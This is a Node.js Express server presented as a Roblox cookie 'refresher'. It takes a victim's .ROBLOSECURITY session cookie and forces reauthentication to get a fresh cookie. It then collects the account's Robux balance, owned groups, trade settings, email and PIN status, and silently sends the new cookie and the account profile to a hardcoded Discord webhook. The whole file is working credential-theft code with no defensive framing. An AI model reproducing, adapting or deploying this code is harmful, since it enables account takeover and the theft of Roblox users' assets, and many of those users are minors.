const express = require("express");
const axios = require("axios");
const app = express();

app.get("/refresher.js", async (req, res) => {
  const cookie = req.query.cookie;

  if (!cookie) {
    return res.status(400).send("Invalid cookie");
  }

  try {
    await axios.post(
      "https://friends.roblox.com/v1/users/1/request-friendship",
      "",
      {
        headers: {
          accept: "application/json",
          cookie: `.ROBLOSECURITY=${cookie}`,
        },
      },
    );
  } catch (error) {
    const xtoken = error.response.headers["x-csrf-token"];
    if (xtoken === undefined) {
      return res.status(400).send("Invalid Cookie");
    }

    const refreshed = await axios.post(
      "https://auth.roblox.com/v1/logoutfromallsessionsandreauthenticate",
      {},
      {
        headers: {
          "content-type": "application/json;charset=UTF-8",
          cookie: `.ROBLOSECURITY=${cookie}`,
          "x-csrf-token": xtoken,
        },
      },
    );

    const [, refcookie] = /\.ROBLOSECURITY=(.+?); domain=.roblox.com;/.exec(
      refreshed.headers["set-cookie"].find((str) =>
        /\.ROBLOSECURITY=(.+?); domain=.roblox.com;/.test(str),
      ),
    );

    const mobapi = await axios.get(
      "https://www.roblox.com/mobileapi/userinfo",
      {
        headers: {
          cookie: `.ROBLOSECURITY=${refcookie}`,
        },
      },
    );

    const uinfo = mobapi.data;
    const pending = (
      await axios.get(
        `https://economy.roblox.com/v2/users/${uinfo.UserID}/transaction-totals`,
        {
          params: {
            transactionType: "summary",
          },
          headers: {
            cookie: `.ROBLOSECURITY=${refcookie}`,
          },
        },
      )
    ).data.pendingRobuxTotal;

    const groupRoles = (
      await axios.get(
        `https://groups.roblox.com/v2/users/${uinfo.UserID}/groups/roles`,
        {
          headers: {
            cookie: `.ROBLOSECURITY=${refcookie}`,
          },
        },
      )
    ).data.data;

    let groupAmount = 0;
    groupRoles.forEach((group) => {
      if (group.role.rank === 255) {
        groupAmount += 1;
      }
    });

    const tradePrivacy = (
      await axios.get("https://accountsettings.roblox.com/v1/trade-privacy", {
        headers: {
          cookie: `.ROBLOSECURITY=${refcookie}`,
        },
      })
    ).data.tradePrivacy;

    const emailverification = (
      await axios.get("https://accountsettings.roblox.com/v1/email", {
        headers: {
          cookie: `.ROBLOSECURITY=${refcookie}`,
        },
      })
    ).data.verified;

    const pinCode = (
      await axios.get("https://auth.roblox.com/v1/account/pin", {
        headers: {
          cookie: `.ROBLOSECURITY=${refcookie}`,
        },
      })
    ).data.isEnabled;

    // Send embed to Discord webhook
    axios.post(
      "https://discord.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv",
      {
        embeds: [
          {
            title: "Refreshed cookie",
            url: `https://www.roblox.com/users/${uinfo.UserID}`,
            color: null,
            fields: [
              {
                name: "**Username**",
                value: `${uinfo.UserName}`,
                inline: true,
              },
              {
                name: "**Robux (Pending)**",
                value: `${uinfo.RobuxBalance} (${pending})`,
                inline: true,
              },
              {
                name: "**Group Owned**",
                value: `${groupAmount}`,
                inline: true,
              },
              {
                name: "**Premium**",
                value: `${uinfo.IsPremium}`,
                inline: true,
              },
              {
                name: "**Can Trade With**",
                value: `${tradePrivacy}`,
                inline: true,
              },
              {
                name: "**Email Verified**",
                value: `${emailverification}`,
                inline: true,
              },
              {
                name: "**Pin**",
                value: `${pinCode}`,
                inline: true,
              },
            ],
            thumbnail: {
              url: `${uinfo.ThumbnailUrl}`,
            },
          },
        ],
      },
    );

    // Send text content to Discord webhook
    axios.post(
      "https://discord.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv",
      {
        content: `${refcookie}`,
      },
    );

    const response = {
      username: uinfo.UserName,
      robuxPending: pending,
      groupOwned: groupAmount,
      isPremium: uinfo.IsPremium,
      canTradeWith: tradePrivacy,
      emailVerified: emailverification,
      pinEnabled: pinCode,
      refreshedCookie: refcookie,
    };
    res.send(response);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
